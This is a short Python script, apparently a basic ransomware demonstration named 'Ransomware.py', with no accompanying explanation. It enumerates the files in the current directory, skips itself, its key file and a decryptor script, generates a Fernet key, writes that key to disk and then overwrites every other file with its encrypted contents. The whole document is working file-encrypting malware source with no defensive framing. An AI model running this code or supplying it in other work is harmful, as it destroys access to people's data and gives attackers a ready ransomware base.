import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "Ransomware.py" or file == "Keyfile.key" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()
print(key)

with open("Keyfile.key", "wb") as thekey:
    thekey.write(key)
    
for eachFile in files:
    with open(eachFile, "rb") as file:
        contents = file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(eachFile, "wb") as file:
            file.write(contents_encrypted)